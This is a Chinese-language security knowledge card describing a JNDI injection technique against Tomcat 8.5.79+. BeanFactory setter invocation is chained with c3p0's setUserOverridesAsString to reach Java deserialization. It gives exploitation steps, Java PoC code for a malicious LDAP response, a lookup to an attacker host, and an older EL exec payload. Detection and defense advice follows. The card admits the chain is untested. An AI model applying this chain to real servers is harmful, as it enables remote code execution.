---
id: web-java-deserialization-jndi-tomcat-beanfactory-setter-forceString-removed
title: Tomcat 8.5.79+ 删掉 forceString 不等于安全：BeanFactory 仍按 RefAddr 名反射调用 setter，用 c3p0 setUserOverridesAsString 再接 readObject
type: scenario
domain: web
path: web/java/deserialization/jndi
technique: jndi-tomcat-beanfactory-setter-triggered-deserialization
aliases:
- forceString 被移除后的 BeanFactory 利用
- Tomcat BeanFactory setter 触发
- BeanFactory 任意 setter 调用
- setUserOverridesAsString JNDI
- 高版本 Tomcat JNDI 绕过
- RefAddr 属性名反射 setter
tags:
- java
- jndi
- tomcat
- beanfactory
- setter
- deserialization
- c3p0
- high-version
- rce
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3W4B
  verified_at: '2026-11-08T21:50:35+08:00'
  notes: 已对照原文核对：BeanFactory 在 8.5.79 含 forceString 即抛异常、getObjectInstance 遍历 RefAddr 按属性名取 getWriteMethod 反射调用 setter、c3p0 WrapperConnectionPoolDataSource.setUserOverridesAsString -> vetoableChange -> parseUserOverridesAsString -> SerializableUtils.fromByteArray -> readObject 的调用栈与正文一致；ResourceRef + factoryClassName 指本地工厂、factoryClassLocation 留空的过门方式亦与正文一致；affected_versions 为原文明确对比的 8.5.58/8.5.79，故保留未改。本次核对未读取图片，仅依据正文。未验证点：PoC 未在本机执行；原文 BeanFactory 一节的示例代码直接复用了 JavaBeanObjectFactory 的 payload（factoryClassName 仍写 JavaBeanObjectFactory），卡片改写为 BeanFactory，属对原文的合理纠正而非原文原文照抄
affected_versions: Tomcat >= 8.5.79（forceString 在 8.5.79 起被移除；8.5.58 仍可用）
---

## 一句话结论

Tomcat 在 8.5.79 里把 `BeanFactory` 的 `forceString`（属性名→任意方法名的映射表）改成「出现即抛异常」，堵掉了 `forceString=x=eval` 这类任意方法调用；但 `getObjectInstance` 仍然会遍历 `Reference` 的每个 `RefAddr`，用属性名去查 bean class 的 `PropertyDescriptor` 并反射调用其 **setter**。因此只要挑一个有危害 setter 的 bean（如 c3p0 的 `WrapperConnectionPoolDataSource.setUserOverridesAsString`），高版本 Tomcat 依旧能在纯本地工厂、不出网的前提下走到原生反序列化。

## 原理

- `org.apache.naming.factory.BeanFactory#getObjectInstance` 的流程分两段：①读 `forceString`，按 `,` 分割、按 `=` 取参数名，建立「属性名 → 方法名」的覆盖映射；②遍历 `Reference` 的 `RefAddr`，若 addr 的类型是 `StringRefAddr`，就取 bean class 对应属性的 `PropertyDescriptor`，拿到 `getWriteMethod()`（setter）并反射调用，把 addr 内容作为参数。
- 高版本（原文对比 8.5.79）只做了第一段的封堵：`forceString` 非空就 `throw new IllegalArgumentException`。第二段「按属性名找 setter 并反射调用」原样保留。于是「任意方法」退化成「任意 setter」，攻击面并没有消失。
- 为什么 setter 就够：Java 生态里不少 setter 名不副实，内部会做反序列化。c3p0 的 `WrapperConnectionPoolDataSourceBase.setUserOverridesAsString(String)` 触发 `VetoableChangeSupport.fireVetoableChange`，监听器 `WrapperConnectionPoolDataSource$1.vetoableChange` 调用 `C3P0ImplUtils.parseUserOverridesAsString`，再经 `ByteUtils.fromHexAscii`/`SerializableUtils.fromByteArray` 走到 `ObjectInputStream.readObject`。整条链只需要受害端 classpath 上有 c3p0，不需要远程 codebase。
- 为什么要用 `ResourceRef` 而不是普通 `Reference`：`NamingManager` 选择工厂是按 Reference 的子类型 + `factoryClassName`，`ResourceRef` 会被 `ResourceFactory`（`FactoryBase` 子类）接受，再由 `ref.getFactoryClassName()` 指向 `org.apache.naming.factory.BeanFactory`；`BeanFactory` 用 `ref.getClassName()` 作为 bean class 去实例化。factoryClassLocation 留空即可在 `trustURLCodebase=false` 的高版本 JDK 下从本地 classpath 加载。
- 与 `forceString` 时代的差别只在触发方式：老 payload 是 `forceString=faster=eval` + `faster=<EL 表达式>` 调 `ELProcessor.eval`；新 payload 是 `userOverridesAsString=HexAsciiSerializedMap:<hex>;` 调 setter 进反序列化。前者依赖被删掉的映射表，后者完全走正常 setter 语义，所以修复后仍成立。

## 触发条件

- 存在 JNDI 注入点（攻击者能控制 `lookup` 的 URL 并返回自定义 `Reference` 序列化数据，如恶意 LDAP/RMI 服务）。
- 受害者 JDK 为高版本（`com.sun.jndi.ldap.object.trustURLCodebase=false`），classpath 含 Tomcat catalina（提供 `org.apache.naming.factory.BeanFactory`）与 c3p0（提供目标 bean 与 sink）。
- 目标 Tomcat 版本已移除 `forceString`（8.5.79 起），此时老 EL payload 失效，本卡手法仍可用。
- 目标 classpath 需具备可被 `readObject` 触发的 gadget，或 sink 本身能造成危害。

## 利用步骤

1. 确认 JNDI 入口与高版本限制；确认受害端有 Tomcat（任意版本均可，8.5.79+ 更能体现差异）与 c3p0。
2. 本地生成 gadget 序列化字节，转成十六进制，拼成 `HexAsciiSerializedMap?<hex>?` 形式的字符串（c3p0 的 `parseUserOverridesAsString` 只接受该前缀格式，尾部分隔符按实现补齐）。
3. 构造 `ResourceRef`：`className=com.mchange.v2.c3p0.WrapperConnectionPoolDataSource`，`factoryClassName=org.apache.naming.factory.BeanFactory`，`factoryClassLocation` 留空；加入 `StringRefAddr("userOverridesAsString", <上一步字符串>)`。
4. 用 LDAP（或 RMI）返回该 `ResourceRef` 的序列化数据（`javaSerializedData`），诱导受害端 `InitialContext.lookup`。
5. `NamingManager` 因 `factoryClassLocation` 为空而从本地 classpath 加载 `BeanFactory` 并调用其 `getObjectInstance`；`BeanFactory` 用 `ref.getClassName()` 实例化 c3p0 bean，再按 `RefAddr` 名找到 `setUserOverridesAsString` 反射调用，进入 `readObject`。
6. 若 `forceString` 封堵导致老 payload 报错，说明只拦了第一段；换成本卡的 setter payload 即可继续。
7. 边界：本卡把「BeanFactory 仍按 `RefAddr` 名调 setter」当作未被移除的第二段能力，这是据其 `getObjectInstance` 行为推导（原文只明确 `forceString` 在 8.5.79 起被拒），而 c3p0 `setUserOverridesAsString` 这条 sink 出自原文的 `JavaBeanObjectFactory` 分支；两者组合在本文未被完整跑通，故 confidence 为 medium。

## PoC

恶意 LDAP 服务端返回的 Reference 构造（示意，未在本机执行）：

```java
ResourceRef resourceRef = new ResourceRef(
        "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource", // bean class
        null, "", "", true,
        "org.apache.naming.factory.BeanFactory",               // 本地工厂
        null);                                                  // factoryClassLocation 留空
resourceRef.add(new StringRefAddr("userOverridesAsString", jndiPayload)); // HexAsciiSerializedMap?<hex>?

Entry entry = new Entry(baseDN);
entry.addAttribute("javaClassName", "java.lang.Class");
entry.addAttribute("javaSerializedData", GadgetUtils.serialize(resourceRef));
result.sendSearchEntry(entry);
```

受害端触发点（示意）：

```java
new InitialContext().lookup("ldap://attacker:1389/BeanFactorySetter/Command");
```

老版本对照 payload（8.5.58 可用、8.5.79+ 抛异常）：`ResourceRef("javax.el.ELProcessor", ..., "org.apache.naming.factory.BeanFactory")` + `StringRefAddr("forceString", "faster=eval")` + `StringRefAddr("faster", "Runtime.getRuntime().exec(...)")`。

## 变体与关联

- **变体一**：setter 只是入口，凡 classpath 上「setter 内含反序列化/脚本求值/文件写入」的 bean 都可替换 c3p0，如各类连接池的 `setConnectionProperties`、日志组件的配置 setter。
- **变体二**：`com.mchange.v2.naming.JavaBeanObjectFactory` 走的是同一类 setter 语义（`findBean` 遍历属性调 setter），可在 `BeanFactory` 不可用时直接顶替（原文即用该工厂配 `userOverridesAsString` 打通）。
- **变体三**：若只拦了 `ResourceRef` 的 factory 白名单，可改用 `LookupRef` + `org.apache.naming.factory.LookupFactory` 达成本地工厂的二次加载。
- **关联**：[[web-java-deserialization-jndi-high-version-beanfactory-el]]（forceString 时代的 EL 方案，本卡的「被修复项」）、[[web-java-deserialization-jndi-high-version-c3p0-javabeanobjectfactory]]（同为 c3p0 sink，入口是 JavaBeanObjectFactory）、[[web-java-deser-c3p0-beanfactory-el-no-egress]]（C3P0 反序列化链转发到 BeanFactory）。

## 检测与防御

- **服务端**：JNDI `Reference` 的 `factoryClassName` 白名单化，禁止 `org.apache.naming.factory.*` 被外部引用解析；升级 Tomcat 后仍应审计 classpath 上的「带反序列化 setter」的第三方 bean。
- **依赖治理**：移除不必要的 c3p0/连接池与 EL 实现；对 `jdk.serialFilter` 设全局白名单，把 c3p0 gadget 相关类挡在 `readObject` 之前。
- **检测**：LDAP/RMI 响应中出现 `javaSerializedData` 且类名为 `ResourceRef`/`LookupRef`、`RefAddr` 名为 `userOverridesAsString`/`forceString` 的流量特征；JVM 内 `WrapperConnectionPoolDataSource.setUserOverridesAsString` 被 JNDI 线程调用的调用栈告警。
- **审计**：把「setter 是否可能触发危险动作」纳入第三方组件准入；对 `PropertyDescriptor.getWriteMethod()` 的反射调用做 RASP 埋点。
